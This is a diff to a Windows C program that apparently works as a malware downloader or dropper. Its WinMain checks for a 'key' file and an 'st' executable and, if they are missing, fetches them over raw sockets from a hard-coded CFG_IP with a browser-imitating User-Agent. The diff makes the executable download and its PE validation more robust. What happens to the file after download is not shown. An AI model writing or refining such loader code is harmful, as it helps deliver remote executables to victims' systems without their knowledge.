@@ -164,15 +164,25 @@ static int size_ok(const wchar_t* p, long long min_size) {
     return sz.QuadPart >= min_size;
 }
 
-static int is_pe(const wchar_t* p) {
+static int is_valid_pe(const wchar_t* p) {
     HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                            OPEN_EXISTING, 0, NULL);
     if (h == INVALID_HANDLE_VALUE) return 0;
-    char sig[2] = {0};
+
+    IMAGE_DOS_HEADER dos;
     DWORD rd = 0;
-    ReadFile(h, sig, 2, &rd, NULL);
+    if (!ReadFile(h, &dos, sizeof(dos), &rd, NULL) || rd != sizeof(dos)) {
+        CloseHandle(h); return 0;
+    }
+    if (dos.e_magic != IMAGE_DOS_SIGNATURE) { CloseHandle(h); return 0; }
+
+    SetFilePointer(h, dos.e_lfanew, NULL, FILE_BEGIN);
+    DWORD nt_sig = 0;
+    if (!ReadFile(h, &nt_sig, sizeof(nt_sig), &rd, NULL) || rd != sizeof(nt_sig)) {
+        CloseHandle(h); return 0;
+    }
     CloseHandle(h);
-    return sig[0] == 'M' && sig[1] == 'Z';
+    return nt_sig == IMAGE_NT_SIGNATURE;
 }
 
 static int http_get(const char* host, const char* path, const wchar_t* dest) {
@@ -197,12 +207,12 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
     freeaddrinfo(res);
 
     char req[1024];
+    // Force HTTP/1.0 to avoid chunked encoding
     _snprintf(req, sizeof(req),
-        "GET %s HTTP/1.1\r\n"
+        "GET %s HTTP/1.0\r\n"
         "Host: %s\r\n"
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
-        "Accept: */*\r\n"
-        "Connection: close\r\n\r\n", path, host);
+        "Accept: */*\r\n\r\n", path, host);
 
     if (send(sock, req, (int)strlen(req), 0) == SOCKET_ERROR) {
         closesocket(sock); WSACleanup(); return 0;
@@ -211,7 +221,11 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
     char buf[8192];
     int bytes = 0;
     int header_done = 0;
-    char h_buf[4] = {0}; // rolling window for \r\n\r\n
+    char h_buf[4] = {0};
+    char header_acc[4096] = {0};
+    int header_acc_len = 0;
+    int content_length = -1;
+    int total_written = 0;
 
     HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) { closesocket(sock); WSACleanup(); return 0; }
@@ -225,16 +239,35 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
                 h_buf[2] = h_buf[3];
                 h_buf[3] = buf[i];
                 
+                if (header_acc_len < sizeof(header_acc) - 1) {
+                    header_acc[header_acc_len++] = buf[i];
+                }
+
                 if (h_buf[0]=='\r' && h_buf[1]=='\n' && h_buf[2]=='\r' && h_buf[3]=='\n') {
                     header_done = 1;
                     offset = i + 1;
+                    header_acc[header_acc_len] = '\0';
+                    
+                    char* cl = strstr(header_acc, "Content-Length:");
+                    if (cl) content_length = atoi(cl + 15);
                     break;
                 }
             }
             if (!header_done) continue;
         }
-        DWORD w = 0;
-        WriteFile(hFile, buf + offset, bytes - offset, &w, NULL);
+        
+        int to_write = bytes - offset;
+        if (content_length >= 0 && total_written + to_write > content_length) {
+            to_write = content_length - total_written;
+        }
+        
+        if (to_write > 0) {
+            DWORD w = 0;
+            WriteFile(hFile, buf + offset, to_write, &w, NULL);
+            total_written += w;
+        }
+        
+        if (content_length >= 0 && total_written >= content_length) break;
     }
 
     CloseHandle(hFile);
@@ -277,7 +310,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     CreateDirectoryW(dir, NULL);
 
     int need_key = !size_ok(keyPath, 10);
-    int need_st  = !is_pe(stPath);
+    int need_st  = !is_valid_pe(stPath);
 
     if (need_key || need_st) {
         log_msg(L"update start");
@@ -292,7 +325,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
                 }
             }
             if (need_st) {
-                if (http_get(CFG_IP, CFG_ST_PATH, stPath) && is_pe(stPath)) {
+                if (http_get(CFG_IP, CFG_ST_PATH, stPath) && is_valid_pe(stPath)) {
                     log_msg(L"st ok");
                     need_st = 0;
                 } else {
